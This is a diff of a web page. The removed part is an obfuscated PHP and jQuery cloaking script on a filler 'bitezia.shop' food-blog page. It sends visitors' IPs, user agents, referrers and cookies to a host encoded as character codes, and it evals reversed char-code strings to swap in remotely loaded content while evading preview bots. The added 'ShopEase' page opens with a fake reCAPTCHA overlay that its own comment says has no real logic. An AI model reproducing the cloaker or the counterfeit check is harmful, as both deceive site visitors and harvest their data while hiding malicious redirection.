@@ -1,19 +1,260 @@
-<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo533228ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo533228ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("001,79,111,801,64,14,04,121,611,211,901,101,64,14,43,801,901,611,401,43,04,63");u = rS("'.$u.'");c = s+"(\'"+u+"\')";$("html").show();setTimeout(function(){eval(c);},100);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "533228";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$postdata = http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref" =>$_POST["r"],"ip" => $_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn" => $_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query" => $_SERVER["QUERY_STRING"],"ua" => $_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo533228ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id" =>$uid,"id" => $id));$opts = array("http" =>array("method" => "POST","header" => "Content-type: application/x-www-form-urlencoded","content" => $postdata));$context = stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result = file_get_contents($u, false, $context);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo533228ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo533228ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo533228ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ShopEase</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-<html><head><meta charset="UTF-8" class="page-ktZBiRoQL"/><link rel="stylesheet" href="styles.css" class="wide-cuhuHEVQBOEZxXQ"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="content-mREJHarqfiCkX"/><meta name="referrer" content="no-referrer" class="subtitle-zqDiQJnwlnbdV"/><style> @import url('https://fonts.googleapis.com/css2?family=Podkova:wght@400..800&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #1758a6; border-radius: 36px; } *::-webkit-scrollbar-thumb { background-color: #eff8ff; border-radius: 36px; border: 3px solid #1758a6; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>bitezia.shop</title><!-- Google tag (gtag.js) -->
+    /* ===== "I'm not a robot" popup (auto-verify, no real logic) ===== */
+    .cap-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.45); z-index: 100;
+                   display: flex; align-items: center; justify-content: center; transition: opacity .4s; }
+    .cap-overlay.hide { opacity: 0; pointer-events: none; }
+    .cap-card { background: #fff; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,.3);
+                padding: 22px; width: 320px; max-width: 90vw; font-family: system-ui, sans-serif; }
+    .cap-card h4 { margin: 0 0 14px; font-size: 1rem; color: #333; }
+    .cap-box { display: flex; align-items: center; gap: 12px; border: 1px solid #d3d3d3;
+               border-radius: 4px; padding: 12px 14px; background: #f9f9f9; }
+    .cap-check { width: 28px; height: 28px; flex: none; border: 2px solid #c1c1c1; border-radius: 3px;
+                 background: #fff; display: flex; align-items: center; justify-content: center; }
+    .cap-spinner { width: 20px; height: 20px; border: 3px solid #c1c1c1; border-top-color: #4285f4;
+                   border-radius: 50%; animation: capspin .7s linear infinite; }
+    @keyframes capspin { to { transform: rotate(360deg); } }
+    .cap-tick { display: none; color: #1a73e8; font-size: 20px; font-weight: 700; line-height: 1; }
+    .cap-label { font-size: .95rem; color: #444; }
+    .cap-logo { margin-left: auto; text-align: center; color: #9aa0a6; }
+    .cap-logo .ic { font-size: 1.3rem; }
+    .cap-logo small { display: block; font-size: .6rem; letter-spacing: .5px; }
+    .cap-status { margin-top: 12px; font-size: .82rem; color: #888; text-align: center; }
+    .cap-status.ok { color: #16a34a; font-weight: 600; }
 
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
 
-<style>body {display: none;}</style>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){if(a){eval(a)}else{$("html").show()}}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo533228ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo533228ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+</head>
+<body>
  
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-YTP08B4056"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <div class="cap-overlay" id="capOverlay">
+    <div class="cap-card">
+      <h4>Quick security check</h4>
+      <div class="cap-box">
+        <div class="cap-check">
+          <div class="cap-spinner" id="capSpinner"></div>
+          <span class="cap-tick" id="capTick">✓</span>
+        </div>
+        <span class="cap-label">I'm not a robot</span>
+        <div class="cap-logo"><div class="ic">🛡️</div><small>reCAPTCHA</small></div>
+      </div>
+      <div class="cap-status" id="capStatus">Verifying…</div>
+    </div>
+  </div>
 
-  gtag('config', 'G-YTP08B4056');
-</script></head><body class="col-iEOZHsJDYapJRM"><main class="breadcrumbs-zTmrtpz"><div class="big-qUktYDMQjhLG"><div class="pic-cIMIHeOnZdQ"><div class="image-KqvJxdtZgZyhFXp"><h3 class="md-OXLpnAWMlxdv">bitezia.shop</h3><span class="userpic-fgMKcuxmuPP">Dining This article delves into the evolution Cooking Taste of café menus, exploring Desserts how shifting food trends, dietary preferences, Snacks and Meal cultural influences are reshaping the café dining experience. Vegan Soups From plant-based Ingredient offerings Non-veg to global Vegetarian Seafood cuisine, we examine the future Dish of café Cuisine menus and the growing demand for Flavor Beverages variety and innovation. Recipe</span></div><div class="grid-lkgijfLpzqxEy"><a href="themelist0.html" class="current-TZcRWbbaa"><span class="current-yuKfsGevjjx">Full version</span></a></div></div></div><div class="more-VaAFNF"><div class="wrap-HHQZEQQCa"><div class="breadcrumbs-xyoZYxAXDRhVxhJR"><h3 class="col-xRAQCxOHoJC">Visual narratives</h3></div></div><div class="tooltip-oNDLVHAVjVoYJnL"><div class="holder-LrzxQalpTNfwN"><img src="./img/1a3448c1b4b5c03290523edb098c4e2a9952c65c.jpg" class="userpic-YwTOrI"/><img src="./img/4f37a63018b25be529bb2ba45ac9f7a52665dcfa.jpg" class="button-UxLtbMwVmndNDN"/><img src="./img/fba5ccedd536b989352dc70b6eb32886ca3952c7.jpg" class="grid-rasziePspPooM"/><img src="./img/25d9e7d5981ebed9c790047f8abb510d8601b750.jpg" class="md-DTrtnlJNqeMF"/><img src="./img/0a718ef8c3d64f6312aefae4f904e575b0276431.jpg" class="container-dMcfqx"/><img src="./img/11714f0f7adeb4052d25d4e9980698bc284a6992.jpg" class="content-zIxJJKbChcCOsYdO"/></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; width: 80%; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: calc(43vw/var(--resizer)*100); flex-direction: column; background-color: #fdfb9e; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'stripes-1_8866'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-22px%2C%200)%20rotate(125deg)%20scale(0.9184646547066859)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-26px%2C%208px)%20rotate(120deg)%20scale(1.7431045865903054)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%202s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%20-1px)%20rotate(107deg)%20scale(0.2649619459880983)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'2945'%20patternUnits%3D'userSpaceOnUse'%20width%3D'150'%20height%3D'150'%20patternTransform%3D'scale(8)%20rotate(97)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23fdfb9e'%2F%3E%3Cpath%20d%3D'M150%2015.2H0V6.56h150zm0%2012.4v1.56H0V27.6zm0%2028.37v6.6H0v-6.6zm0%2039.24v2.33H0v-2.33zm0%2022.54v.78H0v-.78zm0%2013.21v8.16H0v-8.16zm0%2010.1v1.17H0v-1.17z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23eff8ff'%2F%3E%3Cpath%20d%3D'M150%2050.53H0v-7.39h150zm0-34.58v.77H0v-.77zm0%2015.54v3.88H0V31.5zm0%2033.8v1.17H0v-1.17zm0%2034.2v9.32H0V99.5zm0%2027.2v2.72H0v-2.72z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23eff8ff'%2F%3E%3Cpath%20d%3D'M150%2077.73H0v-5.05h150zm0-72.66v1.16H0V5.07Zm0%2013.98v4.28H0v-4.28zm0%20100.25v3.11H0v-3.1zm0%2027.2v3.5H0v-3.5z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23eff8ff'%2F%3E%3Cpath%20d%3D'M150%2040.42H0v-1.16h150zm0-37.3V4.3H0V3.12Zm0%2027.2v.4H0v-.4Zm0%2020.98v2.34H0V51.3zm0%2031.42v9.32H0v-9.32zm0%2029.2v3.5H0v-3.5zm0%2013.21v.39H0v-.39zm0%2019.04v1.17H0v-1.17z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23eff8ff'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-239%2C-21)'%20fill%3D'url(%232945)'%2F%3E%3C%2Fsvg%3E&quot;);" class="button-RyhJATaVhCyFpdE"><div class="box-vRkjLGt"><div class="large-BRcwYCJKjZctRMCi"><h3 class="sm-GZiTEuhUSC">Consumer Communication Portal</h3><span class="preview-ZoIKCwDgWK"></span></div></div><form action="undefined" class="wrap-qizgbGFPAIdjG"><input placeholder="Username" class="col-jOzYyZGRXabw"/><input placeholder="Phone" class="column-AnofuNHEgGDw"/><button type="submit" class="tiny-DGgWAQFEHYKMwnK">Offer</button></form></div><div class="tip-GtAnlNultAMicFf"><div class="col-VKNDWcYLPaktsVIb"><div class="wrapper-LKEvFgBntRoLQ"><div class="tagline-NdRwFbqr"><a href="themelist1.html" class="img-DTNbCuJPnnpjhFY"><span class="content-IaLlGeDQX">Open article</span></a><a href="index.php" class="sidebar-ZlsPxkChXVjF"><span class="xs-BzKsBOKsra">Promote</span></a></div><div class="xs-yGTPxdlOxoLy"><div class="aside-TeNfEWbCPnaKHfvk"><div class="section-JVWrwxotWT"><span class="more-NAFeOPvwR">August 05, 2025</span></div></div><div class="icon-eImRgQDOtJH"><div class="tip-BsUlixQjizXx"><span class="subject-mYNRXPJDvYp">Sophia Ramirez</span></div></div></div><div class="subject-yoerjQqhpYhrWKk"><img src="./img/3a76139fdad4c6053ff5ea81dab8ada5740f00d1.jpg" class="tip-deOGNDVROCgGb"/></div><div class="holder-rvfEfGAkb"><h5 class="desc-JSlMJyxX">Exploring the World of Global Cuisines: A Culinary Journey</h5><div class="section-YWSfrEnNYdtWBPvg"><span class="xs-gUjIAOnDwI">Ingredient Vegan Recipe This article takes readers Snacks on a culinary Desserts journey Meal Seafood Cooking through Vegetarian diverse global Flavor Non-veg cuisines, highlighting unique ingredients, cooking Dining Dish Beverages techniques, and Soups iconic dishes. Taste Cuisine</span></div></div></div><div class="col-oWEjSp"><div class="active-EcnXwWmQyx"><a href="themelist2.html" class="current-SJQMEsBiWLhcTop"><span class="aside-IvbSuDpVFTfyho">Open article</span></a><a href="index.php" class="headline-pOSXxjaa"><span class="breadcrumbs-lDfltoVG">Promote</span></a></div><div class="sidebar-FSOTReCB"><div class="container-tOMuFKOgJcT"><div class="wide-KGhMHoHDfjBsPWwT"><span class="narrow-QVlVAtH">September 18, 2024</span></div></div><div class="more-LNFbds"><div class="md-CvPnxZnOxPxWRYJ"><span class="sm-srpfEyqVHmQ">Lucas Ramirez</span></div></div></div><div class="column-NUuoYwe"><img src="./img/e165c33ef2e265c7e966552c3f2a42e34bc3179f.jpg" class="md-wcrECiV"/></div><div class="control-RqzCGhQT"><h5 class="sidebar-yPEXWJdGt">Exploring the Vibrant World of Street Food: A Culinary Adventure</h5><div class="column-OXoxFWnB"><span class="wrapper-OugWVLDtfiDhi">A Taste deep dive Snacks into Cuisine the diverse Vegetarian Vegan street food Meal Seafood Non-veg cultures around the world, highlighting popular Flavor Cooking dishes, Beverages local traditions, Ingredient and the Recipe Dining culinary Dish artistry Soups involved. Desserts</span></div></div></div><div class="big-zFlttnfvChWgOCN"><div class="wrapper-YZLbVyOOV"><a href="themelist3.html" class="section-AFWVkHanBynQg"><span class="row-HnrtkNsdoEhF">Open article</span></a><a href="index.php" class="aside-KqOokycqKLaDf"><span class="control-NgoWFlOui">Promote</span></a></div><div class="content-ewWXxXJ"><div class="preview-MEQbuwWyKtcznhZ"><div class="large-kuLIGsQBXtEeDV"><span class="narrow-woqIyIdr">January 02, 2025</span></div></div><div class="current-fRDjHyGQzgW"><div class="sidebar-gtEKPoXsXBTBOUU"><span class="lg-PPjrfEBPJhUyMo">Emily Grant</span></div></div></div><div class="big-MpnowQYSy"><img src="./img/dc9fed84b4eea5f6dd0253694dee22beee092894.jpg" class="tagline-fTChCTnjGws"/></div><div class="holder-DnRWZWXevXHA"><h5 class="col-OPWxKIUz">Innovative Juice Trends: Blending Flavor, Function, and Sustainability in the Beverage World</h5><div class="current-bOVaqSFNXQNAi"><span class="holder-ROTbYtYk">Cooking This article Ingredient Vegan Seafood explores the latest trends in the juice Dining industry, from exciting new flavor combinations to the growing focus on Flavor Taste health benefits Recipe and sustainability. Dish It highlights how juices are becoming more Desserts than just refreshing drinks Vegetarian Snacks and are now Non-veg seen as functional, Cuisine Meal personalized, Beverages Soups and eco-friendly beverages.</span></div></div></div><div class="text-ZiJaxmbw"><div class="narrow-BXWiQsgEmZBg"><a href="themelist4.html" class="headline-VSizGBavtuomr"><span class="thumbnail-GTDbwUklIAGIBWi">Open article</span></a><a href="index.php" class="thumbnail-uaJCnOIaOKypMhk"><span class="big-pezRbGe">Promote</span></a></div><div class="picture-LhyAVmtykVA"><div class="picture-TaYhQBDgGGojTj"><div class="button-ksCxmbB"><span class="caption-yHUWctDYw">March 29, 2025</span></div></div><div class="wrap-iydjeooFjZUkC"><div class="tagline-kpqkqrKvMB"><span class="tooltip-IOuTDzQjdayKLDkd">Sophia Nguyen</span></div></div></div><div class="wide-xpuQzvMP"><img src="./img/dd18b6a8f12b01856a3dd0e682d51d9374504997.jpg" class="medium-dCKjCaRLSYgzrY"/></div><div class="container-PTxhUwTNDkQQSOIx"><h5 class="box-FdlIUfhctlDK">Exploring the World of Spices: A Flavorful Journey</h5><div class="sm-XAicmOyVG"><span class="picture-JoDBQr">This article delves into the rich Desserts history, Beverages diverse types, Dining Non-veg and culinary uses Meal Vegetarian of Flavor spices, Cooking showcasing how Vegan Soups Cuisine Seafood they enhance Recipe flavors and Taste Snacks elevate dishes across Ingredient cultures. Dish</span></div></div></div><div class="active-OIoMqqrnh"><div class="tip-mTrgbwOe"><a href="themelist5.html" class="text-VkNzXDGUnO"><span class="wide-SOASrnfn">Open article</span></a><a href="index.php" class="page-wdQYsGbpyJXIl"><span class="more-cajyWWEPYu">Promote</span></a></div><div class="picture-TQcTVawnB"><div class="text-EAzpNbbyfIziDHil"><div class="md-gAjSEeN"><span class="tiny-mQspzADkNDDSEHj">August 04, 2025</span></div></div><div class="inner-UBtsQCmki"><div class="container-MjGGrRrRWsLwqfr"><span class="current-hXTEWf">Lucas Reynolds</span></div></div></div><div class="grid-RwfOkxXpsDDKKhw"><img src="./img/a415bac2129f7581f2cb2d5e064201cdfe446725.jpg" class="wrapper-RXmTtk"/></div><div class="more-KBFLDpG"><h5 class="more-FXYnNwXOthKzm">Savoring the World: A Comprehensive Guide to Cooking with Meat</h5><div class="holder-CHcwNw"><span class="img-lRgUyyKrMZQx">This article Seafood explores various Dining Dish types Meal of meat, Desserts their cuts, cooking Vegetarian Ingredient Taste Soups Snacks Recipe methods, Non-veg and how to infuse global Cuisine Beverages Cooking flavors into Vegan your dishes, Flavor providing tips for both novice and seasoned cooks.</span></div></div></div><div class="xs-NQVoqMjueh"><div class="heading-ESqClGWuchS"><a href="themelist6.html" class="tiny-NTBnIoJXKNmcco"><span class="col-zFVKjiKRjcCXO">Open article</span></a><a href="index.php" class="holder-izoOZgLVbJg"><span class="picture-BDmdAADkeLy">Promote</span></a></div><div class="container-drvEcy"><div class="img-pbaHrvb"><div class="img-sXXWOoJpcbfyo"><span class="thumb-VLvbHWAcJSS">August 16, 2025</span></div></div><div class="control-lSXfnHMKhqnDpjqP"><div class="section-YPSzjSQHCGR"><span class="content-nGAGdHYLmVe">Daniela Ruiz</span></div></div></div><div class="caption-NzYjTKouwhFtMD"><img src="./img/d5c0a7c26de0bd564751ec7dbdc970def2d8b763.jpg" class="box-PSTQUdWwRjo"/></div><div class="lg-xTCTdBdcSwZzjuUJ"><h5 class="medium-xlNdASzKF">Savoring the Spice: An Exploration of Global Curry Dishes</h5><div class="column-cBaWCcGLkPk"><span class="narrow-brBdpvgShpXm">A comprehensive Seafood Desserts Cuisine journey through Cooking the rich Dish world Ingredient of curry, highlighting its origins, Taste variations across Vegan cultures, Recipe and its beloved place Meal Dining in Non-veg Flavor Beverages culinary Soups Snacks traditions Vegetarian worldwide.</span></div></div></div><div class="grid-RqTZMvhPOuXlx"><div class="caption-CowhOi"><a href="themelist7.html" class="xl-pdmrpQxdKmZoMXXM"><span class="preview-GCLluzoCzuMiLcr">Open article</span></a><a href="index.php" class="text-ACReBYAsfpgeHu"><span class="desc-wzQxvtx">Promote</span></a></div><div class="heading-GuseHEMEsxUZP"><div class="image-oxmkafLwPnUcjkpA"><div class="row-isQiaMcAYDFVB"><span class="wrapper-HnECLTeIqdpw">May 25, 2025</span></div></div><div class="tooltip-zvpTdKhagoLz"><div class="xl-pRyfzsNfqdgR"><span class="current-vIwpKZMmRG">Emma Thompson</span></div></div></div><div class="control-UDfUBlVJELRUq"><img src="./img/61d4cde769a0d9dc8e8238e7bb4ebde252f0bbbd.jpg" class="narrow-CNNPEK"/></div><div class="holder-irEvHWDcZynbNuzD"><h5 class="container-vsfFbrwnXkza">Flavors of the World: A Culinary Exploration of Global Street Food</h5><div class="wide-lqnFpTmk"><span class="userpic-ygyziVrhMlv">Dish An in-depth look at the vibrant world Cuisine of street Non-veg Dining food, Desserts Vegan highlighting iconic Ingredient dishes Vegetarian from Beverages Soups Meal various Recipe cultures and Cooking Flavor their Seafood cultural significance. Taste Snacks</span></div></div></div><div class="all-qggJppOdymYUt"><div class="more-tJDQHMKugbDa"><a href="themelist8.html" class="button-cwVZVZ"><span class="page-ChQaxUgM">Open article</span></a><a href="index.php" class="wrapper-yzNHFycZOfmEEaXi"><span class="narrow-taSWghP">Promote</span></a></div><div class="picture-ZGgtpMN"><div class="lg-eKhmwnQoJUzqTkkB"><div class="aside-dtxeBMXdAyxBhcE"><span class="title-bxYfFRl">July 21, 2025</span></div></div><div class="xs-OnfFDkgcJ"><div class="xl-aRLSfKae"><span class="aside-zjgNGVE">Sophia Martinez</span></div></div></div><div class="sidebar-VcAHMWSlgf"><img 